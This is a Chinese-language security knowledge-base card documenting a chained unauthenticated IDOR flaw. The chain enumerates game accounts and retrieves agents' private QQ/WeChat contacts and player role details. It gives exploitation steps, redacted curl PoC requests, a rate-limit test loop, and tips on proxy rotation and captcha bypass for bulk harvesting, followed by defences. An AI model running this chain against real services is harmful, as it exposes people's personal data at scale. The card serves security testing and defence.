---
id: web-generic-auth-unauth-idor-account-agent-contact-role-chain
title: 无认证 IDOR 三端点链：账号存在性枚举 → 代理商联系方式 → 游戏角色画像
type: scenario
domain: web
path: web/generic/auth
technique: unauthenticated-idor-multi-endpoint-profile-chain
tags:
- web
- auth
- idor
- broken-access-control
- pii
- enumeration
- rate-limit
cve: []
severity: high
confidence: high
status: verified
created: '2026-11-05'
updated: '2026-11-05'
verification:
  verified_by: verifier-V102
  verified_at: '2026-11-05T22:37:41+08:00'
  notes: 已对照原文核对三端点链、state 语义、51秒30次无限速；端点已脱敏，未对真实目标复现。
url: /docs/web/generic/auth/web-generic-auth-unauth-idor-account-agent-contact-role-chain/
draft: false
kb_aliases:
- 无认证 IDOR
- 账号枚举 代理商联系方式
- 游戏角色画像泄露
- 三端点攻击链
- 未授权 API 信息泄露
---

## 一句话结论

三个核心业务 API 都没有认证与对象级授权：一个按账号返回“是否存在”，一个按账号直接返回代理商的私人 QQ/微信/群号，一个按 `serverID`+账号返回玩家角色名、等级与角色 ID；三者串起来可在无任何凭据的情况下枚举账号、建立“账号→代理归属→私人联系方式→游戏角色”的完整画像，且 51 秒 30 次请求全部 200，没有速率限制。

## 原理

- **端点 1：账号存在性**。`GET /api/<account-check>?account=xxx` 返回 `state:false` 表示“已被注册”，`state:true` 表示“可用”。后端把“已存在”编码成 false，语义反直觉，但对枚举者足够：批量请求即可判断哪些账号真实存在。
- **端点 2：代理商联系方式**。`GET /api/<agent-contact>?account=xxx` 按账号查询玩家归属的代理商，直接返回 `{"id": "...", "contact": "QQ/微信/群号"}`。没有认证中间件、没有“该账号是否属于请求者”的校验、没有字段脱敏。
- **端点 3：角色详情**。`POST /api/<role-detail>`，请求体 `serverID=1&account=xxx`，返回 `roleID`、角色名、等级、所在服务器。同样无需 token。
- **根因**：后端直接用客户端提供的 `account`/`serverID` 访问数据库对象，没有认证、没有对象级授权（ownership check）、没有速率限制。任意 IP、任意请求者只要知道路径和一个账号名，就能拿到该账号的全部关联信息。
- **放大效应**：端点 2/3 的输入是账号名；结合端点 1 的枚举与注册接口（若验证码可绕过），可以把“需要已知账号名”的中危 IDOR 升级为“批量注册→全量代理 ID 映射→全量联系方式”的高危数据泄露链。

## 触发条件

- 三个端点对公网可达，且不要求 Bearer Token/Session；
- 后端按客户端传入的 `account`、`serverID` 等标识直接查询对象，未校验请求者归属；
- 账号名可枚举（存在性接口、注册接口、业务命名规律）；
- 端点无速率限制/IP 封禁/验证码挑战（原文实测 51 秒 30 次全部 200）。

## 利用步骤

1. 从首页 HTML、JS bundle（axios/fetch 调用）提取 API 路径，识别账号查询、代理查询、角色查询三类端点。
2. 对每个端点做最小化验证：不带任何 Cookie/Token 直接请求，观察是否返回有效数据。
3. 用账号存在性接口批量枚举候选账号（如 `a001`–`z999`），记录 `state` 的语义（注意 false/true 可能反直觉）。
4. 对确认存在的账号调用代理联系方式接口，获取代理商 ID 与私人 QQ/微信/群号。
5. 调用角色详情接口（`serverID` + 账号）获取角色名、等级、角色 ID、服务器，补全画像。
6. 测试速率限制：短时间连续请求，若全部 200 且无封禁，可编写脚本批量执行并保存为结构化 JSON。
7. 如注册接口需要验证码，先评估验证码强度；原文通过逆向滑块协议实现批量注册，从而按代理 ID 精确映射联系方式。

## PoC

```bash
# Step 1: 账号存在性（state:false 表示已注册）
curl -s "https://<target>/api/<account-check>?account=z1xxxxx"
# {"state":false,"data":"账号：z1xxxxx 已被注册！请换个账号命名"}

# Step 2: 无认证获取代理商联系方式
curl -s "https://<target>/api/<agent-contact>?account=z1xxxxx"
# {"code":0,"data":{"id":"10xxx","contact":"QQ12xxxxxxxx"}}

# Step 3: 无认证获取角色详情
curl -s -X POST "https://<target>/api/<role-detail>" \
  -d "serverID=1&account=z1xxxxx"
# {"state":true,"data":{"10xxxx9":{"roleID":1000xxx,"name":"王xxxx来","level":"120"}}}

# 速率限制测试：51 秒内 30 次请求，统计状态码
for i in $(seq 1 30); do
  curl -s -o /dev/null -w '%{http_code}\n' "https://<target>/api/<agent-contact>?account=z1xxxxx"
done | sort | uniq -c
# 预期：30 个 200，无 429/封禁
```

端点路径与参数按目标实际实现替换；原文对路径做了脱敏。

## 变体与关联

- 变体：把 `account` 换成 `userId`、`openid`、手机号或自增 ID，核心都是客户端可控对象标识 + 缺少归属校验。
- 变体：只做认证不做对象级授权（登录后仍可查他人）——本卡是无认证，若加上弱认证则变成普通 IDOR。
- 变体：批量枚举时结合代理池、随机延迟，绕过 IP 频率限制（原文用 SOCKS5）。
- 关联 [[web-generic-auth-authlog-userid-enumeration-authz-bypass]]：同样是“枚举合法 ID 后绕过按 ID 归属的限制”，可对照信息泄露到枚举的链路。
- 关联 [[web-generic-auth-course-id-enumeration-courseware-url]]：按 ID 遍历获取未授权资源，属同类对象级授权缺失。
- 边界：若网关统一要求认证、后端按 token 中的用户身份过滤对象、或对敏感字段脱敏/限流，本链不成立；账号名完全随机且不可枚举时，端点 2/3 的批量利用价值下降。

## 检测与防御

- **认证与对象级授权**：所有业务 API 默认要求认证；在数据访问层校验“请求者是否有权查看该 account/userId”，只允许查自己（管理员按角色放行）。
- **最小化返回**：联系方式、角色详情等敏感字段按需返回并脱敏；错误信息不要区分“账号存在/不存在”，避免枚举。
- **速率限制**：按 IP、账号、会话多维限流；对批量枚举特征（高频、固定参数模式、低多样性）告警与封禁。
- **监控**：统计单 IP/单账号的查询量、唯一 account 数、404/200 比例；对短时间遍历大量 ID 的行为告警。
- **测试**：上线前用无 token 请求逐端点验证；把“对象标识可控 + 无归属校验”加入 API 安全测试清单。
